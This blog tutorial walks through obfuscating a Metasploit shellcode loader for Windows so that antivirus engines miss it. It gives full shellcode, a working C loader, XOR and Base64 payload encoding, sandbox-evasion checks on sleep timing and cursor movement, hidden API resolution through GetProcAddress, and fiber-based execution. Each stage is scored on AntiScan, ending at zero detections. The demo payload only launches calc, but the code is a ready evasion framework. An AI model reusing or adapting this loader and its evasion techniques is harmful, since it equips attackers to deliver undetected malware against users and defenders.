# A Study in Obfuscation

In this blog series, we explore how to obfuscate a Metasploit payload to avoid detection by Antivirus Engines and shall try to go invisible.

We would employ known techniques and see how they affect detection rates uploading the compiled executable to [AntiScan](https://antiscan.me/) as it does not submit the samples to the vendors.

## Environment Setup
To begin with, we would be needing some tools and setup to get started. The first thing is the unobfuscated shellcode we'll be using: 

```bash
RAW_PAYLOAD = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 
    0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 
    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 
    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 
    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 
    0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 
    0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 
    0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 
    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 
    0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
]
```

This will be our base from where we start. The raw, untampered shellcode is placed in `scripts/obfuscator.py`. The python file describes a class `Obfuscator` which takes our shell code and obfuscates it to various levels which is used as the payload in `implant.cpp`

Next up, we need to set up our development environment. For this, we need to install [Visual Studio's C/C++ Development Tools](https://visualstudio.microsoft.com/vs/features/cplusplus/).

Once that is done, we can bring up any IDE of our choice and jump straight to coding. However, if you are using Visual Studio Code, I highly recommend having `x64 Native Tools Command Prompt` as your default. One way of doing is to add the full path to `VsDevCmd.bat` to  VS Code's `settings.json` file as such:

```json
{

    "workbench.colorTheme": "Default Dark+",
    "terminal.integrated.shell.windows": "cmd.exe",
    "terminal.integrated.shellArgs.windows": [
        "/k", "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat", "x64"
    ],
    "terminal.integrated.automationShell.windows": null,
    "explorer.confirmDelete": false,
}
```

## Level 0 - The Raw Shell Code

To begin with, we write a program to execute our shell code with the help of a program as such:

```cpp
/// Compile With:
/// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:executables\level0.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


// Payload String - Level0
unsigned char payload[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
    0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
    0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
    0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
    0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

// Length of payload array
unsigned int payload_len = (unsigned int)(sizeof(payload)/sizeof(payload[0]));

  
/// Main Function
///
/// Returns
///  0 - OK
/// -1 - VirtualAlloc() failed
/// -2 - VirtualProtect() failed
/// -3 - CreateThread() failed
/// -4 - WaitForSingleObject() failed
int main(void){
    BOOL rv;
    HANDLE th;
    DWORD _event = 0;
    void * exec_mem;
    DWORD oldprotect = 0;

    // Allocate a memory buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL){
        // fprintf(stderr, "VirtualAlloc Failed with error code: %d\n", GetLastError());
        return -1;
    }

    // Copy payload to new buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Make new buffer as executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if ( rv == 0 ) {
        // fprintf(stderr, "VirtualProtect Failed with error code: %d\n", GetLastError());
        return -2;
    }

    // Create Thread To run shellcode
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
    if (th == NULL){
        // fprintf(stderr, "CreateThread Failed with error code: %d\n", GetLastError());
        return -3;
    }

    _event = WaitForSingleObject(th, -1);
    if(_event == WAIT_FAILED){
        // fprintf(stderr, "WaitForSingleObject Failed with error code: %d\n", GetLastError());
        return -4;
    }
  
    return 0;
}
```

The program basically takes the payload generated by Metasploit, creates a memory region with **Read** and **Write** permissions to hold the same, followed by changing the permissions of the region to **Read** and **Execute** before finally creating a thread to execute it. 

The above program can be compiled with:
```bash
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:level0.exe /SUBSYSTEM:CONSOLE /MACHINE:x6
```

This should create a `level0.exe` executable file in the current directory which, when run, pops up the `calc.exe` program. 

### Antiscan Analysis
We see that most AV engines flag the binary and rightfully so because it barely contains any obfuscation and Metasploit payloads have well-defined signatures at this point.

[**Antiscan Score: x/26**]()

![Level0 Analysis]()

## Level 1 - XOR it!

The next thing we do is try to try be a little sneaky and encrypt the payload using the simplest encryption technique out there: XOR'ing it. 

With our payload from Level0, any dumb stupid AV engine can just run a simple signature check or even use something like the `strings` command to know that the executable hence produced is major sus. [It would be kinda worrying if it didn't flag this simple thing]

Now coming back to XOR, we would first need a key to encrypt stuff with. For this, I chose a string which was already present in the Level0 executable so as to not arouse any suspicion.

We can then obtain the encrypted string from our `obfuscator.py` script using `Obsfucator.level1()`. As for the executable code, just for the sake of readibilty we add a header file `headers/obfuscators.h`  which contains the `XOR` function:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// XOR two strings
void XOR(unsigned char * payload, unsigned int payload_len, const char * xor_key, unsigned int xor_key_len){
    int j;

    j = 0;
    for (int i = 0; i < payload_len; i++) {
        if (j == xor_key_len) j = 0;

        payload[i] = payload[i] ^ xor_key[j];
        j++;
    }
}

```

And then, we call the `XOR()` function right before copying the payload to the target memory address. 

```c
...
...
XOR(payload, payload_len, XOR_KEY, xor_key_len);

// Copy payload to new buffer
RtlMoveMemory(exec_mem, payload, payload_len);
...
...
```

Finally, we compile it with:

```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\level0.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
```

### Antiscan Analysis

The encryprion does bring down the detection rates a bittle but still, there are ways to go :)

[**Antiscan Score: x/26**]()

![Level1 Analysis]()

## Level 2 - Sleep Patching Sandbox

Taking a short detour from the usual from playing with the shell code, we try and implement some sandbox detection techiniques, starting off with ***"Sleep Patching Sandboxes"***. Accoring to [ICASA](www.isaca.org):

> “Sleep Patching Sandboxes will patch the sleep function to try to outmaneuver malware that uses time delays. In response, malware will check to see if time was accelerated. Malware will get the timestamp, go to sleep and then again get the timestamp when it wakes up. The time difference between the timestamps should be the same duration as the amount of time the malware was programmed to sleep. If not, then the malware knows it is running in an environment that is patching the sleep function, which would only happen in a sandbox.” 

Thus to bypass this, we implement the following function in `sandbox.h` to check for accelerated time:

```c
/// User defined PPDs
#define L_INTERVAL  950    // Lower Time Limit
#define INTERVAL    1000   // Mean  Time Limit
#define U_INTERVAL  1050   // Upper Time Limit

int __check_sleep_patch(){
    DWORD startCount = GetTickCount();
    Sleep(INTERVAL);
    DWORD endCount = GetTickCount();

    DWORD timeSpan = endCount - startCount;
    if ((L_INTERVAL > timeSpan) && (timeSpan > U_INTERVAL)){
        return -1;
    }
    
    return 0;
}
```

Thus if the sandbox is accelerating time, then the `timeSpan` value wouldn't be in the range `L_INTERVAL` and `U_INTERVAL`, hence signifying that the program is running in a sandbox, thereby prompting the program to exit without executing any shellcode in order to avoid detection.

The program is compiled with:
```c
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\level2.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
```

### Antiscan Analysis

Okay, so this did not help much with the detection rates but nevertheless, is a good place to start with sandbox evasion techniques. 

[**Antiscan Score: 15/26**](https://antiscan.me/scan/new/result?id=FDAPjz42vTip)

![Level2 Analysis](https://antiscan.me/images/result/FDAPjz42vTip.png)

## Level 3 - Where is the cursor?

Again, instead of tampering with the shellcode itself, we are employing some more sandbox detection techniques. This time, we are monitoring for User Input, which in this case, is the cursor movement as such:
```c
int __check_cursor_activity(){
    int __infinity_loop = 0;
    POINT p1, p2;
    BOOL res1, res2;
    HDESK desktop_handle;

    // Switch to input desktop if different from current one
    desktop_handle = OpenInputDesktop(0, TRUE, GENERIC_READ);
    SetThreadDesktop(desktop_handle);


    // The GetCurorPos() can fail at times so just retry it 5 times and 
    // if it still fails, then exit out with an error code
    while(1){
        res1 = GetCursorPos(&p1);
        if (res1) break;
        Sleep(INTERVAL);
        __infinity_loop += 1;
        if (__infinity_loop == 5) return FALSE;
    }
    __infinity_loop = 0;
    Sleep(INTERVAL*10);

    while(1){
        res2 = GetCursorPos(&p2);
        if (res2) break;
        Sleep(INTERVAL);
        __infinity_loop += 1;
        if (__infinity_loop == 5) return FALSE;
    }

    if (res1 && res2){
        if (p1.x==p2.x || p1.y == p2.y || ((p1.x-p2.x)==(p1.y-p2.y))){
            return FALSE;
        }
        else {
            return TRUE;
        }
    }
    else{
        return FALSE;
    }

}

```

We are keeping a track of the Cursor position. If the cursor doesn't move for a while then we exit out of the program without running any of that suspicious shell code.


### Antiscan Analysis

This seemed to have drastically bring down the detection scores. Thats's a huge improvement considering the barely tampered with payload. 

[**Antiscan Score: 8/26**](https://antiscan.me/scan/new/result?id=iyKaH5ChMD18)

![Level3 Analysis](https://antiscan.me/images/result/iyKaH5ChMD18.png)


## Level 4 - Going Bases

Next up, we try to encode our payload using the good ol' **Base64** encoding technique to mask our payload a tad bit more. We generate the Base64 encoded payload using `Obfuscator.level2()` which does everything upto `Obfuscator.level1()` plus base64 encodes the whole thing. This is just one step out many more which we can employ to add an extra layer of obfuscation to our payload

### Antiscan Analysis

This doesn't really have such an adverse effect on the detection rates. However, any obfuscation is a plus in the end.

[**Antiscan Score: 6/26**](https://antiscan.me/scan/new/result?id=YkOZYbkCWBnr)

![Level4 Analysis](https://antiscan.me/images/result/YkOZYbkCWBnr.png)

## Level 5 - Where did the functions go?

One of the methods AV engines flag malicious programs is by looking at the various functions they call at runtime as well as by using methods like `string` analysis. So what if we could just do away with that? We achieve this using two methods:

- By replacing our easy-to-read function names with more sinister(i.e, random) ones. The `translate.txt` file corelates the original functions with the translated ones
- As for native windows functions, instead of directly calling them, we first obtain the handle to the corresponding system DLL and use the `GetProcAddress()` function to retrieve the address of the corresponding function. To add to the obfuscation, we also XOR the string arguments passed to the function so as to not leave any trace behind. For example, we obfuscate `VirtualAlloc()` as such:
```c
/// In definitions.h
// The function signature
LPVOID (WINAPI * _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
....
// Typedef
typedef LPVOID (__stdcall * __type_virtualalloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
....
// XOR Encrypted function name
unsigned char __virtualalloc[] = {0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x09, 0x25, 0x26, 0x24, 0x2f, 0x00 };
..... 
```
```c
/// In obfuscators.h
// Decrypting XOR'd function name
boUpJkYnxh29(__virtualalloc);
// Getting handle to the function and appropriately typecasting it
_VirtualAlloc = (__type_virtualalloc)GetProcAddress(_kernel32, (LPCSTR)__virtualalloc);
// Manage Error
if (_VirtualAlloc == NULL){
    // fprintf(stderr, "Could not find VirtualAlloc in kernel32.dll\n");
    return -10;
}
```
```c
/// In implant.cpp
// Allocate a memory buffer for payload using new function
exec_mem = _VirtualAlloc(0, decoded_data_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (exec_mem == NULL){
    // fprintf(stderr, "VirtualAlloc Failed with error code: %d\n", GetLastError());
    return -1;
}
```

Once compiled, we can run `strings` from SysInternals to actually examine the resulting binary and notice that all the system function names previously being reflected in the output of the command are now gone.

### Antiscan Analysis

Adopting this, the analysis seems to be further lowered, bringing us even closer to zero detection

[**Antiscan Score: 1/26**](https://antiscan.me/scan/new/result?id=M2xQpE6PZckd)

![Level5 Analysis](https://antiscan.me/images/result/M2xQpE6PZckd.png)

## Level 6 - Get your Fibers in!

Finally, we try alternative methods to execute shell code using [Fibers](https://docs.microsoft.com/en-us/windows/win32/procthread/fibers), which is the minimal execution unit of a modern operating system. We convert the main thread running the program into a `Fiber` amd then create a new one from it and switch to the context of the newly created Fiber, much like what we used to do with threads. 

```c
/// In `implant.cpp`
....
// Convert main Thread to fiber
th = _ConvertThreadToFiber(NULL);
if(th == NULL){
    // fprintf(stderr, "ConvertThreadToFiber failed!\n");
    return -3;
}
....
fiber = _CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
if (fiber == NULL){
    // fprintf(stderr, "CreateFiber Failed with error code: %d\n", GetLastError());
    return -4;
}

_SwitchToFiber(fiber);
....
```

Compiling with the usual intructions gives us our final executable.

### Antiscan Analysis

This seems to do wonders as it brings the detection rates to zero(atleast at the time of writing this) and I guess we can say that we now have an undetectable sus-looking-program running our shellcode.

[**Antiscan Score: 0/26**](https://antiscan.me/scan/new/result?id=QEqWv42rdLiY)

![Level6 Analysis](https://antiscan.me/images/result/QEqWv42rdLiY.png)
